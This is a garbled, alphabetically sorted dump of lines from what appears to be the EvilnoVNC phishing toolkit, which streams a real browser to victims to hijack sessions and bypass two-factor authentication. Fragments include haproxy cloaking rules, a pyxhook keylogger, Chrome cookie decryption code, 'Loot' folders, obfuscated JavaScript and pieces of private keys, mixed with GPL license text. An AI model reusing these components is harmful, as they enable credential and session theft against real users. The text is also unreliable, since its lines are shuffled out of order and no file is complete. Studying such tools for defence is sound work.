D0:B6:9D:86:6D:AE:B4:E1:CA:F0:C1:F5:4D:82:45:7E:13:06:CD:1A:DE:49:A3:80:DC:21:6A:5C:A8:F4:84:1B
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
DB1Q1Mvld30tNaPf9t4x6rLjvwm1xOS6Az4VPTxl/o1XRwPs6KchYsmzo6OpRStN
DmDQjEpLfEZoC1jv9WZMNd7rito5yMbeNoELUE9HOBE4MMkhPMqBJ
Dynamic resolution:
ENV DISPLAY=:0
ENV XAUTHORITY=
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
EXPOSE 80
EXPOSE 8111
EjHli/ddJ47ZcCggEBAMB98uNTCAo1eJNm
EvilKnievelnoVNC</title>
EvilnoVNC
EvilnoVNC/tmp/
Examples:
Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
F5div { text-align: center
FILE_IGNORE_NEW_LINES)
FROM alpine:latest
FROM haproxy:2.8.3-alpine
FROM webdevops/php-nginx:8.2-alpine
FTcVmdqSfkyJaJFDXAD3mejLt5HUFRwX0yNOWp/K2CouRxghLLcVrlJ2eh23Kf6h
FcYjqPiI13k/diRruZBrZi3hq9foqXW7WiEE7W5QN
FkMjASv6rRA4grsdopQSFdRgBVy/DKkfGqxS
Foundation.  If the Program does not specify a version number of the
GDFK4sjy9uxnka8hbguv0QKYmlhCckLu
GNU General Public License for most of our software
GXSxlKH
HROCzOI60kZbuF4qohCJCIcs6MuhE
HTTP/1.0 503 Service Unavailable
Hiakwzvov7YK9i/PhdUcJ9Hjsq8BjT27l5dSuw5x5uDc7nX2N0UXIO1rIumNf
Host: {host_key}
I8NS7UxiCw4g4nTgo6hN3ozrNMnn2V4Ck/GjbRsK6h4Ud8v0VlEdIdNyGEaurEgk
ITyxPm022uWWvjXVwAzUdiNM98Jhzcs3du4F9h3kReB3A/aTAamSSGZaM7GkLVNT
IboZdn2T2jv6C2DUIBQRH6xVa0gWAwRv0BSWCoYfU
IjXeT92JGu5kGtmLeGr1
IqZk3hkmI5thG4RWHStZXAVkVO5RkINKaf
It's recommended to clone the complete repository or download the zip file.
JBwOBH3C/lFSdTWZYJnmJPceYEychWcDSJWqJGrsLjidyHsQ
JY6WqCvdJLZi27Kk4jUwLAujiXeF7mHi3wrntj5E8lNCSvCiOD
K/6EWG/32aOt4hRZMrVnNQvIFjxRsLrUfv3DKHSxjjViXIsW7UvXiEFog3eHpmFP
KDng
KPv1000
Kkl4OkMnFfFEchRwpMcbDC49raBTUyWrNgtCz4x/
KmzbNSC0gkrmMahnk8aB
KoZIhvcNAQEBBQADggIPADCCAgoCggIBALnFHsYOOB0xH0h2fWHn33aFEx7x7XS4
KrMkl2DbuGkXrQ15DTL
KuDQqAVyPKmwnY087LXCqqKDsHLrzO2Py
Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
LdcLefLSdNqrGaxmKncw28aWvqeX5ve5NiSYq1OxJq4zn/UU27YFbEfnjOpckCIV
License by making exceptions from one or more of its conditions.
License of the Program or a work on which the Program is based.  The
License would be to refrain entirely from conveying the Program.
Loot/
M.begins_with_dot = function(s)
M.build_pattern = function(pattern)
M.specifies_generic_scheme = function(s)
M.specifies_scheme = function(s)
M.trim = function(s)
M.wildcard_origin_allowed = function(allowed_origins)
M1oXDTQyMTIwNjEwNTkwM1owTTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUt
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlEf
MIIDezCCAmOgAwIBAgIUGed/PH/KMHRGNkH48gLDxCHGhGAwDQYJKoZIhvcNAQEL
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCUR/5NXNBdLzSG
MIIFEzCCAvugAwIBAgIUSt/
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5xR7GDjgdMR9I
MpsOeTq6hheoK1v3gRGdGmaRFZfh8f4/GiQvsgXev3WzUNuAzfHIZ
MzQwNTE4MTc0MjAxWjAZMRcwFQYDVQQDDA50ZXN0aW5nLXNlcnZlcjCCAiIwDQYJ
NtYVc0HfPV
O2vIkQwTsryfV
OFtLKhFDZAOJHpitpuXjXXKmU6I8zSSq5Fh6EAVgWN
Original idea by [@mrd0x](https://twitter.com/mrd0x): https://mrd0x.com/bypass-2fa-using-novnc 
PNiMk8R5zOrDttqMOAC9109CA4qvjE=
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
PgGGR633QZKcJeiudTwSsQItslhQpXZKcUPeK3b
PgfcMLbhB4nNcBDTPxE
Program specifies that a certain numbered version of the GNU General
Pxuyeiy4n
READY TO OVERTAKE
RESOLUTION=$(head -1 ./tmp/resolution$SID.txt)
RESOLUTION=$(head -1 /home/user/tmp/resolution$SID.txt)
RESOLUTION=$1
RFB.cursors = {
RFB.messages = {
RMB0f/jDedt0Yd41O1N5Xq0Q6/cfkvPnSsZFKBRIZ74qcezgpxoD1ortMm4/o7PC
RTo8/vsL3R5JGE9nfRmNpPtj20pmhfSI0YkwxReVKo95ToTGzzTlxCHefY8WjJIS
RUN addgroup root docker
RUN adduser -h /home/user -s /bin/bash -S -D user 
RUN apk add alpine-conf sudo bash xvfb xdpyinfo lightdm-gtk-greeter x11vnc chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev php socat python3-tkinter
RUN apk add docker
RUN apk add sudo bash strace tzdata xvfb xdpyinfo x11vnc xdotool chromium python3 py3-pip git openssl curl python3-dev php83 php83-openssl socat python3-tkinter
RUN apk update
RUN chmod 666 /etc/chromium/chromium.conf
RUN chmod 777 /etc/chromium/
RUN ln -s /usr/share/zoneinfo/Europe/Berlin /etc/localtime
RUN mkdir -p /home/user/.vnc 
RUN mkdir -p /var/lib/dbus 
RUN mkdir /home/user/extension/
RUN rm -rf /usr/bin/python 
RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/tabIndex = -1/tabIndex = 1/' /home/user/noVNC/core/rfb.js
SID=$3
SUCH DAMAGES.
Source.
States should not allow patents to restrict development and use of
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
TODO add svr urlp
TODO kiosk.zip
TVzQXS80hoNmXLD1
TdAHbsU/l74YIgGOvkNhvhjcYsoamBtm
The hypothetical commands 
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.
This tool has been created and designed from scratch by Joel G
U3RhdGUxFDASBgNVBAoMC0V2aWxLbmlldmVsMRMwEQYDVQQDDApjb250cm9sbGVy
URL=$(head -1 php.ini 
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
USER user
Ub61tFcYD
Usage:  ./start.sh $resolution $url
User Product is transferred to the recipient in perpetuity or for a
V50YwC8XcNbeBLrRjvG9OwSQ
VWjiJZM
Vr5vtQuKJa7Gmo
VwIDAQABo1MwUTAdBgNVHQ4EFgQUuOOeQlUsQAUh3F4pd9wHTsPlRx4wHwYDVR0j
W4uN5QGFhrglc57sb/dViVc/N4ZOpY/gVhbJQqua4o8
WEBPAGE=$2
WORKDIR /home/user
WSzhzydjXnIMz3EMgZgVuzTUM
WWaLnRWNGHJ4MiEZAxoMWrqLMYKT/iZMc7ZKv92WEl
X3M30
XQp9/ajh0DHIBSjR9Ugm5aKMOeicpdON7PessE3CKaVHZ23/U9YaDsj2cJJ0pRit
Xv9uasE3ryUq1EtsqvpGtrxTLE1EmP
Y12hb8IVCFQGnT6ycuNAs0vHGbpvbWB3mgo0DQ
YVWDkdiXV6vW
YhnNHjBYHYvDUd/yw34u9bri8dgcz/L
You can support my work buying me a coffee:
YstxI1w
Z5tNxz2Cpw==
ZeSoAVdkdrZd4V2HsJGVDnfw3vUNRpW3bvsiUOj7ldrI
ZiuzvmFVg5HYl1er1vu6SJ2DgkxN1Y8
[ ! $victimPort -eq 443 ] 
[ $x -lt 10 ] 
[0-9]
[[ $i -lt 10 ]] 
[[ -f ./tmp/reqid$SID.txt ]] 
[[ -f ./tmp/useragent$SID.txt ]] 
] = code
] deleting former resolution
_   _(_) 
_ __   __
_/  
_0x345d2d
_0x345d2d==='error'
_0x4b7f=function(){return _0x56998a
___ 
___/ 
____
_____
a client is connected
a further restriction but permits relicensing or conveying under this
a modified version of its Corresponding Source.  The information must
aHi9YDzBAFiCDj14GDw
aXpA3FNbGvqZw0755A1yKoDYq2LSa26iZC65PEvQiHvMX97hV9wOm1
abbr { text-decoration: underline dotted 1px
accessToken=$(mktemp -u 
access_log   /docker.stdout
accesslog.txt
accesstoken=$accesstoken
acl is_admin url_param(accesstoken) ---accessToken---
add_header Access-Control-Allow-Origin 
add_header Content-Length 0
add_header Content-Type text/plain
address new problems or concerns.
adminPort=1300
adversely affects the operation of the network or violates the rules and
after
alert(_0x52906f(0x9d)):window[_0x52906f(0x92)][_0x52906f(0x9c)]='/'
align-items:center}.spacer{margin:2rem 0}.h1{line-height:3.75rem
an absolute waiver of all civil liability in connection with the
and execute modified versions of a covered work in that User Product from
and the Corresponding Source of the work is not available for anyone
and you may offer support or warranty protection for a fee.
animation: none
any implied license or other defenses to infringement that may
any other work released this way by its authors.  You can apply it to
appropriately publish on each copy an appropriate copyright notice
attaching ${this._rawChannel} to Websock
auth td {
author or copyright holder as a result of your choosing to follow a
authors of previous versions.
avoid the special danger that patents applied to a free program could
backend controller
backend novnc
background-color: 
background-color: black
background-color: white
background-color:transparent
background-image:url(data:image/gif
background-size: 30px 30px
background: 
background: black
background: transparent
balance leastconn
bar button {
bar button.dis:hover {
bar button:hover {
bar h1 {
bar p {
bar {
bar0 { background: 
bar1 { background: 
bar2 { background: 
been installed in ROM).
beyond what the individual works permit.  Inclusion of a covered work
bind :1300 ssl crt /etc/certandkey.pem
bind :443 ssl crt /etc/certandkey.pem
blinking connect button
blockuser()
bmask
body {
border-color:
border-left:.125rem solid 
border-radius: 2px
border-radius:.313rem
border-radius:50%
border-top: 4px solid 
border-top: 5px solid 
border: 1px solid 
border: none
border:.3rem solid 
bottom: 0
bottom: 0px
bottom: 20px
bqpFvhZXAgMBAAECggEABVveuGwIyb1ZgB0Cl4n7qYhKJKKqy2LB5OKnFANApmY1
break
bsNrHE6jRKRLB2CcFlsn/JpTECM
btn.onclick = null
but do not include claims that would be infringed only as a
buttons enabled
by the Free Software Foundation.
by the Installation Information.  But this requirement does not apply
c1PClHAGc0vx1ynEojtlRtY
cBR7pN
cIFLn/zWdb0lhY1Q7O
cU0CggEBANqWZPbEKmpkgFN
can do so.  This is fundamentally incompatible with the aim of
can regenerate automatically from other parts of the Corresponding
can { margin-top: 20px
cancel_key = ord(
case 0:
case 1:
case 2:
case 3:
caution: you have full control
cd ..
cd ../EvilnoVNC
cd ../haproxy 
cd EvilnoVNC
cd EvilnoVNC 
cd controller 
chmod 
chmod 660 /var/run/docker.sock
chmod 777 Loot
chmod a
chromedate
circumvention of technological measures to the extent such circumvention
clear:both
clear:none
client connections are terminated
client is blacklisted
client successfully logged in
closeblock()
cmd=block
cmd=logaccess
cmd=reset
code is in no case prevented or interfered with solely because
color:
color: 
color: black
color: white
columns .col {
columns h2 {
combination as such.
command -v bash
command -v docker   >/dev/null 
command -v realpath >/dev/null 
command -v screen 
conditioned on the non-exercise of one or more of the rights that are
conditions are met.  This License explicitly affirms your unlimited
connect button
connect to see what is happening
connecting to ${this._url}
consequence of further modification of the contributor version.  For
console.log(item)
const DEFAULT_BACKGROUND = 'white'
const DISCONNECT_TIMEOUT = 3
const DOUBLE_TAP_THRESHOLD = 50
const DOUBLE_TAP_TIMEOUT = 1000
const GESTURE_SCRLSENS = 50
const GESTURE_ZOOMSENS = 75
const MOUSE_MOVE_DELAY = 17
const UI = {
const WHEEL_LINE_HEIGHT = 19
const WHEEL_STEP = 50
const c = decodeURIComponent(document.cookie)
const ca = c.split('=')
const d = new Date()
const debug = true
const extendedClipboardActionCaps    = 1 << 24
const extendedClipboardActionNotify  = 1 << 27
const extendedClipboardActionPeek    = 1 << 26
const extendedClipboardActionProvide = 1 << 28
const extendedClipboardActionRequest = 1 << 25
const extendedClipboardFormatDib    = 1 << 3
const extendedClipboardFormatFiles  = 1 << 4
const extendedClipboardFormatHtml   = 1 << 2
const extendedClipboardFormatRtf    = 1 << 1
const extendedClipboardFormatText   = 1
const key = ca[0]
const password = readQueryVariable('password')
const searchStrings = [
const securityTypeARD               = 30
const securityTypeMSLogonII         = 113
const securityTypeNone              = 1
const securityTypePlain             = 256
const securityTypeRA2ne             = 6
const securityTypeTight             = 16
const securityTypeUnixLogon         = 129
const securityTypeVNCAuth           = 2
const securityTypeVeNCrypt          = 19
const securityTypeXVP               = 22
const source = document.getElementsByTagName('html')[0].innerHTML
const url = window.location.href 
const useFallback = !supportsCursorURIs 
const val = ca[1]
content:none}.zone-name-title{margin-bottom:1rem}}.loading-spinner{height:76.391px}.lds-ring{display:inline-block
continue
continue 2
cookie _hau maxlife 5m insert indirect nocache secure dynamic
cookieKey=$(mktemp -u 
cookies
cookies.forEach(function(item) {
copy of the Program in return for a fee.
copyurls {
country that you have reason to believe are valid.
covered work so as to satisfy simultaneously your obligations under this
cp -R Downloads/Default 
cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
cp EvilnoVNC/run-template.sh $erun
cp controller/src/phishboard/index.template $dash1
cp controller/src/phishboard/interact.template $dash2
cp haproxy/haproxy-template.cfg $cfg
cp haproxy/run-template.sh $hrun
cp run-template.sh $run
csJprQnPCMsj10ael
cursor: auto
cursor: default
cursor: pointer
d.setTime(d.getTime() 
d2iQTBBmjlFuGdFvy8jGnnTqv8qxlevGkI2fnf66MMNzzUUqSXg6QycV8URyFHCk
d8pgZrzmHW
d9d9d9
d9d9d9}a{color:
date=$(date 
date_default_timezone_set('Europe/Berlin')
datetime.datetime
ddNXpEXa6knxL7WVXvvH
def OnKeyPress(event):
def decrypt_cookies(encrypted_value):
def get_chrome_datetime(chromedate):
def main():
default_backend controller
default_backend novnc
defaults
display: block
display: inline
display: inline-block
display:block
dn1h5992hRMe8e10uIzWoxnvQuBjJ3NJAOIcro5b5ahKp5yrrKkQp88y
docker build --rm -t evilnovnc .
docker build --rm -t haproxy .
docker build --rm -t webdevops/php-nginx .
docker image prune -f
docker ps -a
docker run --rm --name hap --network evil -p ---victimPort---:443 -p ---adminPort---:1300 
docker run --rm --network evil --name controller 
docker stop $(docker ps -a -q)
docker system prune --all 
document.cookie = key 
documented (and with an implementation available to the public in
done
doubtful cases shall be resolved in favor of coverage.  For a particular
dynamic-cookie-key ---cookieKey---
e5e5e5
echo $RESOLUTION > ./tmp/resolution$SID.txt
echo $TITLE > title.txt 
echo $URL
ee730a}.lds-ring div{border-color:
ee730a}.main-content{margin:8rem auto
else
else _0x71d5d2['push'](_0x71d5d2['shift']())
error {
error_log    /docker.stderr warn
error_reporting(E_ALL)
errorfile 503 /etc/haproxy/503.http
eslint-disable no-unused-vars 
eslint-enable 
eu5mdyQZ720FAoIBACEJrQdLbLqmKOlSjeupjEHIA/3cjEaM8R
except Exception as ex:
except KeyboardInterrupt:
excuse you from the conditions of this License.  If you cannot convey a
exit
exit 1
exit(0)
exit(1)
export DISPLAY=:0
export REQID=$(head -1 /home/user/tmp/reqid$SID.txt)
export RESOLUTION=$(head -1 /home/user/tmp/resolution$SID.txt)
export USERA=$(head -1 /home/user/tmp/useragent$SID.txt)
export default UI
export default class Cursor {
export default class Keyboard {
export default class RFB extends EventTargetMixin {
extension GLX 
extract($config)
f6LeqTDS20bLjQOCA1
fOCDCFo4p3i0tBog
fastcgi_param SCRIPT_FILENAME     $request_filename
fastcgi_pass php
fastcgi_read_timeout 600
fastcgi_split_path_info 
fclose($file)
fff}a:hover{text-decoration:underline
fflush($file)
flQIzxuWxOkc0lDCnU8wHp54IvE8eaiUEsw3PCT2sUoEcQ6dMYz7tG8XmI1cq46E
flex-direction:column
flex-wrap:wrap
flex: 1
flex:1
float: left
float: right
font-family: monospace
font-family: sans
font-family: sans-serif
font-size: 100%
font-size: 110%
font-size: 120%
font-size: 140%
font-size: 16pt
font-size: 200%
font-size: 4px
font-size: 60%
font-size: 65%
font-size: 80%
font-size: 90%
font-size:.75rem}.footer-inner{border-top:1px solid 
font-size:1.25rem}.core-msg{line-height:1.5rem
font-size:1.5rem
font-size:1.5rem}.h2{line-height:1.5rem
font-size:1rem
font-size:2.5rem
font-weight: bold
font-weight: normal
font-weight:400}.body-text{line-height:1.25rem
font-weight:400}@media (max-width:720px){.h1{line-height:1.75rem
font-weight:500}.core-msg{line-height:2.25rem
font-weight:500}.h2{line-height:2.25rem
font=DOS%20Rebel
footer { border-top: 1px solid 
for ($i = 0
for ((i=1
for and in connection with specific products or compilations that
for enforcing compliance by third parties with this License.
for i in $(seq $instances -1 1)
for i in {$instances..1..1}
for which you have or can give appropriate copyright permission.
for x in $instances
for(let form of forms) {
for(let input of inputs) {
foreach($data as $dat) {
foreach($lines as $line) {
foreach($list as $elem) {
foreach($orig as $o) {
foreach($state as 
foreach($state as $s) {
foreach($targets as $t) {
form of a work.
free software which everyone can redistribute and change under these terms.
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
frontend admin
frontend victim
function DynamicResolution() {
function GET($var)  { return isset($_GET[$var])  
function POST($var) { return isset($_POST[$var]) 
function SERVER($var) { return isset($_SERVER[$var]) 
function base64url_decode($data) {
function base64url_enc(str) {
function base64url_encode($data) {
function base64url_encode(buffer) {
function block() {                                                                                                                                                                                                                             
function blockuser() {
function cleanup {
function closeblock() {
function cors_response(txn)
function credentialsAreRequired(e) {
function focusCan(e) {
function getState($state) {
function get_state() {
function help {
function hide() {
function log(msg) { if(debug) console.log(msg)
function logaccess() {
function logsubmit() {
function lookupServerId($reqid) {
function lookupUserId($id) {
function lookupUserId($reqid) {
function mark() {
function random_str(
function reset(btn) {
function resetserver() {
function sendPaste() {
function sendRequest(url) {
function sleep (time) {
function start() {
function storeInp(e) {
function updateDesktopName(e) {
function update_state($array) {
function warn(msg) { if(debug) console.warn(msg)
fyjdg29W9N51AILkIjq17Wd0XJcZcLGquLFlnSrQbhR
g2ZcsPUVxiOo
gKKm4
gRYPOaEmRbBO
git clone https://github.com/JoelGMSec/EvilnoVNC
global
global $accesslog
global $reqid
global $statefile
gmlotMECtpelgKz
governed by this License along with a term that is a further
green dot
gzAoGAceeN
h1 {
h2 {
h2 { font-size: 120%
haproxy 
haproxy/blacklist.acl
haproxy/whitelist.acl
have designed this version of the GPL to prohibit the practice for those
have the freedom to distribute copies of free software (and charge for
header pre { font-size: 30%
header { border-bottom: 1px solid 
height: 100%
height: 16px
height: 40%
height: 400px
height: 42px
height: 97%
height:1.875rem
height:1.875rem}.lds-ring div{box-sizing:border-box
help
hide()
hint {
hkiG9w0BAQsFAAOCAQEAAE/nDZpUav/hgKk0lUMYWCP9n5LrMcJcz9EYbop
hl=default
hold nx       5s
hold obsolete 5s
hold other    5s
hold refused  5s
hold timeout  5s
hold valid    3s
holder fails to notify you of the violation by some reasonable means
hp6PinUqoIwQ91tAgGILIC1xgIo9snlQXeCcYrT0PApx1WB
html {
http-request auth unless { http_auth(mycreds) }
http-request deny deny_status 400 unless is_admin 
http-request deny if { hdr(User-Agent) -i -m sub bot } 
http-request deny if { urlp(reqid) -m found } { urlp(reqid) -f /etc/blacklist.acl }
http-request deny unless is_admin 
http-request redirect location https://<real-site> unless { urlp(reqid) -m found }
http-request redirect scheme https unless { ssl_fc }
https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc
https://developer.chrome.com/docs/extensions/reference/cookies/
https://docs.haproxy.org/2.6/management.html
i < exps.length
i1UDeXRlFwsrpe/25qwTevJSrUS2yq
i3qkw0ttGy40DggNW6qRb4W
if ! (( $(ps -ef 
if (!control) stopEvent(e)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
if ($length < 1) throw new 
if ($request_method = OPTIONS ) {
if (request.status >= 200 
if [[ $
if [[ $RESOLUTION == dynamic ]]
if docker -v 
if neither you nor any third party retains the ability to install
if(!empty($connected) 
if(!empty($data)) {
if(!empty($lines)) {
if(!empty($log)) {
if(!empty($reqid))
if(!file_exists($path)) {
if(!inputVal) return
if(!is_array($orig)) {
if(!isset($reqid)) {
if(!trim($state3)) {
if($showhint) {
if($sum > 0) :
if(($json = file_get_contents($statefile)) !== false) {
if(($json = file_get_contents($statefile)) === false) {
if((int)$sid < 10 
if((int)$svrno < 10 
if(_0x20c3e4===_0x2a5c94)break
if(_0x47670a[_0x2bb1d3(0x99)]===0x4){var _0x345d2d=_0x47670a[_0x2bb1d3(0x90)]
if(domain.localeCompare(targetDomain) !== 0) {
if(e.keyCode == 17)
if(empty($targets))
if(event.ctrlKey 
if(is_array($state)) {
if(isset($usera)) {
if(k1) k1.parentNode.remove()
if(k2) k2.remove()
if(port) {
if(prefersDarkMode) {
if(source.includes(val)) {
iframe {
implementation is available to the public in source code form.  A
import 
import EventTargetMixin from './util/eventtarget.js'
import RFB from './core/rfb.js'
import base64
import json
import os
import pyxhook
import sqlite3
import { clientToElement } from './util/element.js'
import { dragThreshold } from './util/browser.js'
import { setCapture } from './util/events.js'
import { stopEvent } from '../util/events.js'
in accord with this section must be in a format that is publicly
in an aggregate does not cause this License to apply to the other
in force.  You may convey covered works to others for the sole purpose
in one of these ways:
include /opt/docker/etc/nginx/vhost.common.d/
include fastcgi_params
included in conveying the object code work.
includes interface definition files associated with source files for
index index.php
inp {
inp.focus()
input:checked 
inputVal = encodeURIComponent(inputVal)
instances=$2
instances=---inst---
instances=4
ipdbtaIQTtblA35IgL7xjMlzBQ/zcu
is a consumer product regardless of whether the product has substantial
is effected by exercising rights under this License with respect to
is widely used among developers working in that language.
it.  (Additional permissions may be written to require their own
j3c1t9RtIwZFAmBdkvNylzZjrfHKA4TCvizc155KMiJdAjowSAEC1j/fd3Dg5w
j4NspXErjquCLRCd1LcNvsk7JL7k1Z
jM3ODOUijERbbwfnKAgZZqRIozSYjwIDAQABAoICAAPVnXAhPlbelKGW3uyZBWDq
jNajGe9C4GMnc0kA4hyujlvlqEqnnKusqRCnzzL6coYyMxrOgIabS/zIuMIfrHlM
jPmJdqzKZLSgb/5sn89MD/enlwKBgQDAv6KEROEL9CgxBInHouGPBxjiuxocdwe5
jVO4Ky3IPlPWT
jlBXsed3FKBTnQ2Uyiqi10g/DGPhmG7Lvb4w2ueb9XS2hK
jobs
justify-content:center}.clearfix:after{display:initial
jz8E6LA81FkXAcwBH4/7DZXvyIQtVs
k3rY2YbOCTz3QLe3/B0HpDSvSt1vU
kU2i7RU8vIVAVBojHMkeQxjZAIyMZ
kZUOd/De9Q1Glbdu
ka2vFMsTUSY/4qbNs1ILSCSuYxqGeTxoH6BFg85oSZFsE6RTaLtFTy8hUBUGiMc
keep intact all notices of the absence of any warranty
keep intact all notices stating that this License and any
key location in setup.sh
kill open connections
know their rights.
l10n.setup(LINGUAS)
l5Yxz9GBOgLEjj
lWnQo7UTT6b4Qq5VnV5Rn07IU2RC3wEs60hcZdwU4Fjl6oQrJBRruA
later version.
left > pre { display: none
left pre {
left {
left { float: none
left: 0
left: 0px
left: 5%
let byteArray = utf8Encode.encode(str)
let desktopName
let domain = document.location.host
let inputVal
let request = new XMLHttpRequest()
let resString = window.innerWidth 
let rfb
let url
let url = window.location.toString()
let utf8Encode = new TextEncoder()
let xhr = new XMLHttpRequest()
license from a particular copyright holder is reinstated (a)
licenses of parties who have received copies or rights from you under
licenses to the work the party's predecessor in interest had or could
line-height:1.125rem
list.acl
listen 443 ssl
listen 80 default_server
ln -s /etc/Loot/$ldir/Chrome /home/user/Chrome
ln -s /etc/Loot/$ldir/Downloads /home/user/Downloads
ln -s /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
local M={}
location 
location / {
log.txt targets.json haproxy/
log_file = os.environ.get(
logaccess()
logsubmit()
loot 
lrTN/niBl6BJQtlwuNvucUNPLxBQNYageLBMSSQ
lu8mVg0YpXb6FAmyj0a
lua-load /etc/cors.lua
m/5UIvox9KnxqvhZy7xNXLNTODWtYdwGmphkeb0ioiz5
m2eDU7Iwekkcq40PE1Z7
makes it unnecessary.
margin-bottom: -3px
margin-right: 1%
margin-top: 20px
margin-top: 30px
margin-top: 34px
margin: 0 0 2px 10px
margin: 10% auto
margin: 20px 0
margin: 20px 0 0
margin: 4px 0 0
margin: 4px 0 4px 20px
margin:0
material under section 10.
max-height: 220px
max-height: 300px
max-width:60rem
may consider it more useful to permit linking proprietary applications with
measure under any applicable law fulfilling obligations under article
measures.
method-getAll
mez Molina // @JoelGMSec
might be different
min-height: 300px
min-height:100vh}a{transition:color .15s ease
mkdir -p /home/user/Downloads
mkdir -p Loot
mode http
modification follow.
modification has been made.
modify any covered work.  These actions infringe copyright if you do
n as defined in rfbproto
n into 
nBjJBiDfQQKBgGTn4ujoNzngHBVToVrNiwpFkbgijZ426b9LVwSDktUzMrRj4qtT
nEE1CKmy/rxAARyg9CTDuW64
nKGMjMa
nameserver ns1 127.0.0.11:53
nbsp
network may be denied when the modification itself materially and
new_hook = pyxhook.HookManager()
new_hook.HookKeyboard()
new_hook.KeyDown = OnKeyPress
nl=$'
nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980
nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac 
nohup startx 
nohup startx chromium 
nohup sudo pip3 install pyxhook pycryptodome --break-system-packages 
non-permissive terms added in accord with section 7 apply to the code
not control copyright.  Those thus making or running the covered works
not survive such relicensing or conveying.
not working directly (httpOnly)
nothing other than this License grants you permission to propagate or
notice like this when it starts in an interactive mode:
o0XYXQu
oH1sJ
occurring solely as a consequence of using peer-to-peer transmission
of the particular user or of the way in which the particular user
on the Program.
opacity: 0
opacity: 1
option forwardfor
option of following the terms and conditions either of that numbered
or can get the source code.  And you must show them these terms so they
otherwise be available to you under applicable patent law.
overflow-y: scroll
overflow: hidden
ox/mX6E0/R3XjIKXc8tmP5N4FLPLkyntkuXHKX5xARQbQO2UrT5FUQa1
p { margin: 4px 0
p7NVxAbmFEbElumcjWwddGeEGsgGqsXI34DazaFsx1s
padding-bottom:1rem}.clearfix:after{display:table
padding-left:.5rem}.fact{border:.063rem solid 
padding-left:1.5rem}.main-wrapper{display:flex
padding-top: 30px
padding-top:1rem
padding: 1%
padding: 10px 40px
padding: 15px 0
padding: 4px
padding: 4px 10px
padding: 4px 4px 2px
padding: 4px 6px
padding: 8px 0
padding:0}html{line-height:1.15
padding:1rem}.fact .fact-title{font-weight:500}.footer{margin:0 auto
paragraph of section 11).
parse-resolv-conf
parseInt(_0xefc6e2(0x94))/0x6
parseInt(_0xefc6e2(0x95))/0x9
parseInt(_0xefc6e2(0x9a))/0x3
parseInt(_0xefc6e2(0x9b))/0xa
part of a transaction in which the right of possession and use of the
parties to make or receive copies.  Mere interaction with a user through
parts of the aggregate.
party means to make such an agreement or commitment not to enforce a
patent against the party.
patent license (a) in connection with copies of the covered work
patent sublicenses in a manner consistent with the requirements of
patents cannot be used to render the program non-free.
pattern of such abuse occurs in the area of products for individuals to
pd7Q/ZLnpvHTrCVG
permission to link or combine any covered work with a work licensed
permission to run the unmodified Program.  The output from running a
php -q -S 0.0.0.0:8111 
php // https://textkool.com/en/ascii-art-generator
php endif
php if($auth_cnt > 0): 
php if($click_cnt > 0): 
position: absolute
position: relative
position: sticky
position:absolute
position:relative
price.  Our General Public Licenses are designed to make sure that you
prior to 60 days after the cessation.
programs which are used unmodified in performing those activities but
propagate the contents of its contributor version.
protecting users' freedom to change the software.  The systematic
protocols for communication across the network.
provided under this License.  Any attempt otherwise to propagate or
public statement of acceptance of a version permanently authorizes you
qV7OFzZM5q453YITFyrg0KgFcjypsJ2NPOy1wqqig7By68ztj8votVA3l0ZRcLK6
qY0c6GD0dWHmSWlzvlZMWXeMsnpMaPzxJH/gaEIKjheqD/HAxWVdwQTdGcQ1feMG
qZm1bhLvgC1BQ23txcO5IsS4s/WicrMyHtUdJe
qtV0aJlVbRMCL3lYhaNepdDYRZCdSoLP9VzTGBdwX7uYWvk95r5NyFb0iX58IraS
r or 
rdASW/ZpiVKdxuFBzkWQ7abmfw6taZh0ozqrJorKSLRKvEpLzbgV82MhU/688YKh
received notice of violation of this License (for any work) from that
recipients a copy of this License along with the Program.
refresh input { cursor: pointer
refresh p {
refresh {
reinstated permanently if the copyright holder notifies you of the
removal in certain cases when you modify the work.)  You may place
render -noreset > /dev/null 
request.send()
reset button
reset</button>
reset=1
resetserver()
resolvers res
restart EvilnoVNC instance
return
return 204
return M
return String.fromCharCode(val)
return _0x31b270
return _0x4b7f()
return btoa(Array.from(new Uint8Array(byteArray)).map(val => {
return decodeURIComponent(match[1])
return false
return true
reviewing courts shall apply local law that most closely approximates
right -->
right .req { font-size: 110%
right {
right { margin-bottom: 60px
right { width: 100%
right: 0
right: 30px
rjAfBgNVHSMEGDAWgBQj7MqSUvhqGB4fz
rm -Rf 
rm -f $cfg 
rm -f $dash1 
rm -f $dash2 
rm -f $erun 
rm -f $hrun 
rm -f $run 
rm -f accesslog.txt 
rm -f haproxy/blacklist.acl 
rm -f haproxy/whitelist.acl 
rm -f submitlog.txt 
rm -f targets.json 
rm -rf EvilnoVNC/tmp/
rm -rf EvilnoVNC/tmp/.
rm -rf Loot/
